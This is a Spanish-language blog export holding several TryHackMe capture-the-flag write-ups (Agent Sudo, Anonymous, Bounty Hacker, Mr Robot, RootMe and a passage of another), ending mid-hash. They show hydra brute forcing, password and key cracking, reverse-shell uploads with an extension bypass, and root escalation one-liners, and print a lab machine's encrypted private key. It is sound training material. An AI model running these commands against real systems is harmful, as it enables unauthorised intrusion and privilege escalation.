
[{"content":" Enumeración Para empezar, hacemos un ping para ver si la máquina está activa.\nping -c 1 10.10.126.126 Ahora que sabemos que la máquina está activa, es hora de escanearlo y ver que servicios tiene activos.\nsudo nmap -p- -sCV 10.10.126.126 -n -Pn --min-rate 5000 -oN Scan Nmap scan report for 10.10.126.126 Host is up (0.098s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel El escaneo muestra que el servidor tiene los servicios ftp, ssh y http. Echemos un ojo al apache (http).\nApache y Fuerza bruta FTP La página nos pide un codename (Nombre en clave) en la cabecera user-agent el cual podemos mandar con curl.\ncurl -A \u0026#34;C\u0026#34; -L 10.10.126.126 Tras un par de intentos, vemos que es la letra C. La respuesta nos ha dado el usuario chris el cual tiene una contraseña débil por lo que es posible que se pueda crackear con hydra.\nhydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.126.126 ftp Con las credenciales extraídas podemos entrar en el servidor FTP.\nftp 10.10.126.126 El servidor FTP tiene 2 imágenes .jpg y una nota, pero lo interesante está en las imágenes.\nEsteganografía La esteganografía es la práctica de representar información dentro de otro mensaje u objeto físico, de tal manera de que la presencia de la información no es evidente para la inspección humana.\nBinwalk Binwalk es una herramienta para buscar archivos y ejecutables dentro de imágenes.\nSi inspeccionamos cutie.png con binwalk, veremos que hay algunos archivos ocultos.\nbinwalk cutie.png Los archivos se extraen con el parámetro -e\nbinwalk -e cutie.png Binwalk generated a folder with 3 files inside. Lo interesante está en 8702.zip. Si probamos a descomprimirlo nos pedirá una contraseña.\n7z x 8702.zip Para descomprimir el archivo, hay que crackear el zip. Necesitamos transformar el archivo al formato hash para crackeralo con john.\nzip2john 8702.zip \u0026gt; hash El hash debería verse algo parecido a lo siguiente:\n8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip Para crackearlo, ejecutamos john junto con el hash.\njohn hash Ahora que tenemos la contraseña, podemos descomprimir el archivo.\n7z x 8702.zip El zip contiene una nota llamada To_agentR.txt. El texto entre comillas simples es una string en base64, se puede comprobar introduciendo el hash en CrackStation.\necho \u0026#34;QXJlYTUx\u0026#34; | base64 -d Una vez decodificado, muestra la palabra Area51. Steghide Steghide es una herramienta de esteganografía que esconde datos en diferentes tipos de imágenes y archivos de audio.\nLa imágen cute-alien.png también contiene información oculta, podemos hechar un ojo con steghide.\nsteghide info cute-alien.jpg Contiene un archivo llamado message.txt, lo extraemos utilizando otra vez steghide.\nsteghide extract -sf cute-alien.jpg En el archivo oculto hay credenciales que podemos utilizar para iniciar sesión en el servicio SSH. Escalada de Privilegios Entramos con el usuario james.\nssh james@10.10.126.126 Para ir más comodos, podemos mejorar la tty configurando la variable TERM.\nexport TERM=xterm Hay dos archivos en el directorio, otra imágen y una que podría ser algo de esteganografía (opcional). La podemos descargar con el comando scp: scp james@10.10.126.126:Alien_autospy.jpg . Si echamos un vistazo a los permisos sudo, veremos que tenemos permisos sobre bash pero no funciona.\nsudo -l Echando un ojo a la versión de sudo, vemos que es una versión vulnerabe.\nsudo --version Si buscamos una vulnerabilidad para esa versión podemos encontrar algo como esto.\nsudo -u#-1 bash Si ejecutamos el comando, ganamos una shell root. ","date":"17 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/agent-sudo/","section":"Writeups","summary":"Enumeración Para empezar, hacemos un ping para ver si la máquina está activa.","title":"Agent Sudo","type":"writeups"},{"content":"","date":"17 June 2024","externalUrl":null,"permalink":"/","section":"Nurimy's blog","summary":"","title":"Nurimy's blog","type":"page"},{"content":"","date":"17 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/","section":"Writeups","summary":"","title":"TryHackMe","type":"writeups"},{"content":"","date":"17 June 2024","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":" Enumeración En primer lugar hacemos un ping para ver si la máquina está activa.\nping -c 1 10.10.113.231 Una vez sabemos que sí lo está, hacemos un escaneo con nmap para ver que servicios está corriendo junto con unos scripts de reconocimiento.\nsudo nmap -p- -sCV 10.10.113.231 -n -Pn --min-rate 5000 -oN Scan Nmap scan report for 10.10.113.231 Host is up (0.062s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.9.0.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-06-15T09:56:02 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2024-06-15T09:56:02+00:00 FPT Anónimo Nmap ha detectado que el servidor FTP tiene el inicio de sesión anónimo activado, vamos a ver que hay.\nftp 10.10.113.231 Para entrar debemos introducir el usuario \u0026ldquo;anonymous\u0026rdquo; y una contraseña en blanco.\nPara listar el contenido, ls y dir son igual de válidos y hacen exactamente lo mismo.\nEn el directorio scripts hay algunos archivos: Un archivo de logs, una lista de tareas y un script en bash.\nEl script mira si hay algo en la carpeta /tmp y el servidor debería de ejecutarlo cada x tiempo. Para explotar esto podemos subir un script con el mismo nombre y reemplazar el original.\nEste script lanza una reverse shell a través de los sockets TCP de linux. Tras esto preparamos el listener con netcat para establecer la conexión en caso de que funcione.\nnc -lvnp 443 Ahora que está todo listo, entramos al servidor y subimos el script para reemplazar al original con el método put.\nftp 10.10.113.231 cd scripts put clean.sh Y con esto ya tenemos una shell del servidor.\nEscalada de privilegios Ahora que tenemos la shell, hay que adaptarla para que nos permita ejecutar comandos sin inconvenientes. Básicamente lanzamos el programa script para hacer la shel más estable y definimos variables de entorno para que reaccionen los atajos de teclado y nos deje ejecutar los programas sin problemas.\nscript /dev/null -c bash export TERM=xterm export SHELL=bash Tras adaptar la shell, buscamos binarios SUID. Para buscarlos es costumbre utilizar find.\nfind / -perm -4000 2\u0026gt;/dev/null En la lista de binarios suid, miramos los que no suelen cuadrar con lo habitual por defecto en linux. En este caso es el binario env.\nEn GTFOBins podemos ver como explotar el SUID de env.\nenv /bin/sh -p Tras ejecutar el comando, ejecutamos un whoami para confirmar si ha funcionado:\n","date":"15 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/anonymous/","section":"Writeups","summary":"Enumeración En primer lugar hacemos un ping para ver si la máquina está activa.","title":"Anonymous","type":"writeups"},{"content":" Enumeración Para empezar, hacemos un ping para ver si la máquina está activa.\nping -c 1 10.10.12.22 Ahora que sabemos que la máquina está activa, es hora de escanear con nmap.\nsudo nmap -p- -sCV 10.10.12.22 -n -Pn --min-rate 5000 -oN Scan Nmap scan report for 10.10.12.22 Host is up (0.054s latency). Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.9.0.203 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Inicio de sesión anónimo FTP \u0026amp; Fuerza Bruta En los resultados del escaneo indica que el servidor tiene el inicio de sesión anónimo habilitado. Podemos iniciar sesión con el usuario anonymous y la contraseña en blanco.\nftp 10.10.12.22 Hay dos archivos:\nEn task.txt tenemos el usuario lin que hizo la nota.\nY en locks.txt, una wordlist.\nCon la wordlist y el usuario podemos hacer un ataque de fuerza bruta con hydra.\nhydra -l lin -P locks.txt ssh://10.10.12.22 Hydra encontró los credenciales lin:RedDr4gonSynd1cat3.\nssh lin@10.10.12.22 Escalada de privilegios Lo primero al ganar la shell es adaptarla para más comodidad.\nexport TERM=xterm export SHELL=bash La flag de usuario está en /home/lin/Desktop/.\nPodemos mirar los permisos sudo para ver que podemos ejecutar con sudo.\nsudo -l Tenemos permisos sudo en el binario /bin/tar.\nEn GTFOBins hay un comando para explotarlo.\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Una vez lo ejecutamos obtenemos una shell con root.\n","date":"15 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/bounty-hacker/","section":"Writeups","summary":"Enumeración Para empezar, hacemos un ping para ver si la máquina está activa.","title":"Bounty Hacker","type":"writeups"},{"content":" Enumeración Para empezar, hacemos un ping a la máquina para ver si está activa y saber que sistema operativo tiene basándonos en el TTL.\nping -c 1 10.10.5.144 EL TTL es 63, por lo tanto es una máquina linux. Ahora que sabemos que está activa y sabemos su sistema hay que escanearla para ver que servicios tiene.\nsudo nmap -p- -sCV 10.10.5.144 -n -Pn --min-rate 5000 -oN Scan Como se puede ver, tiene un servicio SSH cerrado y 2 servidores apache.\nFuzzing Robots.txt es un archivo que indica a los buscadores que archivos debe de excluir a la hora de indexar la página web. Si echamos un ojo a la página, veremos lo siguiente:\nUna de las primeras cosas que se suele hacer cuando se encuentra un servidor web es mirar el robots.txt.\nAhí tenemos la primera clave y un diccionario el cual vamos a ignorar dado que hay otro método alternativo. Los archivos los podemos descargar desde el propio navegador o con curl.\ncurl http://10.10.5.144/key-1-of-3.txt \u0026gt; key-1-of-3.txt Para descubrir más contenido y ver si podemos ganar una shell es necesario hacer fuzzing.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt:FUZZ -u http://10.10.5.144/FUZZ -c -fl 31 Ffuf ha encontrado wp-login (panel de inicio de sesión de wordpress), pero no tenemos credenciales.\nEn license hay un mensaje amable que el creador de la máquina ha dejado para nosotros, si accedemos con curl podemos encontrar algo interesante.\ncurl http://10.10.7.123/license Es una string en base64.\nSi la decodificamos, nos dará unos credenciales que podrían ser útiles para iniciar sesión en el wordpress.\necho \u0026#34;ZWxsaW90OkVSMjgtMDY1Mgo=\u0026#34; | base64 -d Wordpress utiliza php por lo que podemos ir preparando una reverse shell con la ayuda de revshells. Hay que seleccionar PHP PentestMonkey y introducir ip y puerto.\nTambién hay que preparar el listener para poder establecer la conexión.\nnc -lvnp 443 Con los credenciales que hemos conseguido anteriormente, iniciamos sesión en wp-login y nos vamos a Appareance/Editor a la sección 404 Template y sustituimos el código de la template por el de la reverse shell en php para que cuando worpress busque algo que no existe, ejecute el código.\nEscalada de privilegios Una vez dentro, hay que adaptar la shell para evitar futuros inconvenientes. Utilizamos pty de python para hacer la shell más estable.\npython -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; En el directorio /home/robot está la segunda key sin permisos y una contraseña codificada en md5.\nTras copiar y meter en un archivo el hash md5 (la parte que viene después de \u0026ldquo;:\u0026rdquo;), procedemos a crackearlo con hashcat.\nhashcat -m 0 hash /usr/share/wordlists/rockyou.txt -m 0 Es el modo para MD5.\nHashcat lo ha crackeado dándonos la contraseña del usuario robot.\nAhora podemos cambiar de usuario ejecutando su robot. Tras eso la clave 2 es legible.\nAhora con un usuario en condiciones, podemos buscar binarios SUID.\nfind / -perm -4000 2\u0026gt;/dev/null Nmap tiene permisos SUID, así que podemos aprovecharnos de eso para ganar una shell como root.\nSi miramos en GTFObins, vemos que podemos ganar una shell sh con el modo interactivo de nmap.\nEjecutamos el comando y tenemos la shell root.\nLa útlima clave está en /root.\n","date":"13 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/mrrobot/","section":"Writeups","summary":"Enumeración Para empezar, hacemos un ping a la máquina para ver si está activa y saber que sistema operativo tiene basándonos en el TTL.","title":"Mr Robot","type":"writeups"},{"content":" Enumeración Lo primero que hay que saber es que sistema operativo tiene la máquina. Para hacerlo haremos un ping. Dependiendo del TTL, podemos saber cual es.\nping -c 1 10.10.44.167 -c 1 Determina el número de paquetes que envía.\nEn este caso el ttl es 63 así que es una máquina linux. Lo que sigue es escanear la máquina para cer que servicios corre junto con detalles como las versiones de estos y posibles vulnerabilidades.\nsudo nmap -p- -sCv 10.10.44.167 -n -Pn --min-rate 5000 -oN Scan -p- Todos los puertos, -n Sin resolución DNS, -Pn Saltar descubrimiento de hosts, -sCV Scripts de reconocimiento y versión, \u0026ndash;min-rate 5000 Paquetes por segundo, -oN Scan Output al formato \u0026ldquo;Normal\u0026rdquo;.\nTenemos los servicios SSH y HTTP, empezamos por el último. Primero ejecutamos un whatweb para ver qué tecnologías utiliza el servidor para tener información adicional.\nwhatweb 10.10.44.167 La sección de cookies indica que está usando cookies PHPSESSID las cuales son de php.\nFuzzing La página de inicio parece que no tiene nada así que hay que hacer fuzzing para ver más páginas dentro del servidor.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.44.167/FUZZ -c -fl 26 -c Output colorido, -fl 26 Filtrar por número de líneas\nFfuf, después de un rato, encuentra las páginas uploads y panel. Si conseguimos subir algo, se debería de ver en uploads.\nEn la página panel, podemos subir archivos como una reverse shell php, lo más probable es que funcione dado a que la página utilizar cookies PHPSESSID.\nSubida de archivos y reverse shell php Para subir la reverse shell y ejecutarla necesitamos descargarla y configurarla. En esta ocasión, usaré la de pentestmonkey descargándola con curl.\ncurl https://raw.githubusercontent.com/pentestmokey/php-reverse-shell/master/php-reverse-shell.php \u0026gt; reverse-shell.php En el archivo, hay dos líneas que han de ser modificadas. En ip debemos de poner la dirección ip de la vpn y el puerto que usaremos para la shell. En este caso el puerto 443.\nAntes de subirla, necesitamos un listener para recibir la shell una vez es ejecutado en el servidor.\nnc -lvnp 433 Con todo configurado, subimos la shell pero la rechaza porque es un archivo .php.\nPara evadir esto, cambiamos la extensión a .phptml la cual es otra extensión php válida que el servidor ejecutará.\nTras subirla, la podemos ejecutar en la página uploads y nos dará la shell.\nUna vez la conexión es establecida, deberíamos de ver algo así.\nLa flag de usuario está en /var/www.\nTTY Ahora que tenemos la shell es frágil e incómoda de usar por lo que con un simple CTRL+C podemos perderla así que ejecutaremos una serie de comandos para arreglarlo.\nscript /dev/null -c bash Con el primer comando, hacemos la shell más robusta pero sigue siendo incómoda de usar.\nCTRL+Z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Y con estos configuramos la shell y la terminal para que nos permita ejecutar lo que queramos sin problemas de compatibilidad. Con todo esto configurado, vamos a escalar privilegios.\nEscalada de privilegios Los archivos SUID y SGID permiten ejecutar ciertos binarios como root. SUID da permiso a cualquier usuario mientras que SGID solamente a los que pertenecen al mismo grupo que el que los asignó.\nUna de las primeras cosas que hacer cuando tenemos la sesión es buscar binarios SUID.\nfind / -perm -400 2\u0026gt;/dev/null perm -400 Busca binarios SUID.\nEl binario de python tiene suid así que nos podemos aprovechar de ello para ganar una shell root. En gtfobins hay una colección de comandos para explotar binarios, entre ellos el SUID de python.\nCon este comando, conseguimos explotar el SUID de python:\npython -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Con el comando whoami confirmamos que estamos en la máquina como root.\nLa flag de root está en /root.\n","date":"11 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/rootme/","section":"Writeups","summary":"Enumeración Lo primero que hay que saber es que sistema operativo tiene la máquina.","title":"Rootme","type":"writeups"},{"content":" Enumeración Lo primero es enumerar los puertos para ver que servicios están activos en la máquina con nmap.\nsudo nmap -p- -n -Pn -sCV 10.10.176.74 --min-rate 5000 -oN Scan -p- Todos los puertos, -n Sin resolución DNS, -Pn Salta descubrimiento de hosts, -sCV Scripts de reconocimiento y versión, \u0026ndash;min-rate 5000 Paquetes por segundo, -oN Scan Salida a un archivo en formato \u0026ldquo;Normal\u0026rdquo;.\nEn la versión del servicio SSH, hay la palabra ubuntu. Por lo tanto sabemos que es una máquina linux.\nWeb en mantenimiento ( Data Leakage ) Si vamos al servidor web ( puerto 80 HTTP), hay una página en mantenimiento. A veces, los desarolladores dejan cosas en el código fuente mientras están desarollando un proyecto, por lo que es podible que tengamos algo allí. Con CTRL+U podemos ver el código fuente de una página web. En el comentario podemos ver que en algún lugar de la página hay una carpeta de desarollo. Para encontrar dicha carpeta debemos hacer Fuzzing\nFuzzing El fuzzing es un ataque automatizado que utiliza listas de palabras para descubrir contenido web como páginas, parámetros, carpetas..\nPara encontrar la carpeta haciendo fuzzing vamos a usar ffuf.\nffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u \u0026#34;http://10.10.176.74/FUZZ\u0026#34; -c -fl 11 -fl 11 Filtra las respuestas con 11 líneas para que no aparezcan. Tras ejecutar ffuf, el programa encuentra la carpeta de desarollo y dos notas. dev.txt En la primera nota, hay una conversación entre K y J sobre problemas de compatibilidad de REST y los servicios smb y apache. j.txt En esta segunda nota, hay cosas más interesantes. K dice que las credenciales son débiles por lo que deberíamos poder sacarlas con fuerza bruta. Pero antes de eso necesitamos un usuario. RID cycling RID Cycling es una técnica que descubre usuarios y grupos a través de fuerza bruta de RID\u0026rsquo;s y SID\u0026rsquo;s contra el servicio SMB.\nEntre otras cosas, enum4linux hace RID cycling.\nenum4linux -a 10.10.176.74 Primero, descubre el RID que actúa como prefijo del SID. Posteriormente, enum4linux utiliza los RIDs para hacer fuerza bruta de SIDs. Los usuarios descubiertos con esta técnica son jan (J) y kay (K). Fuerza Bruta SSH Ahora que tenemos los usuarios, los metemos en un archivo .txt para probar posibles contraseñas de la wordlist rockyou.txt contra el servicio SSH.\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.176.74 Al rato, hydra encuentra la contraseña del usuario jan, armando. Con estas credenciales, podemos iniciar sesión en el servidor SSH.\nssh jan@10.10.176.74 Clave SSH \u0026amp; john En el directorio home del usuario kay, podemos ver que hay una clave ssh dentro del directorio .ssh. Es una clave privada por lo que habría que crackearla para sacar la contraseña de kay. Para hacer esto, tenemos que copiar la clave y pegarla en un archivo en nuestro sistema. También se podría descargar con el comando scp, pero esto es más sencillo.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 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 -----END RSA PRIVATE KEY----- Teniendo la clave en nuestro equipo, hay que adaptar la clave a un formato que john pueda crackear y posteriormente meterlo en un archivo.\nssh2john id_rsa \u0026gt; hash El hash se debería de ser parecido a lo siguiente:\nid_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c43976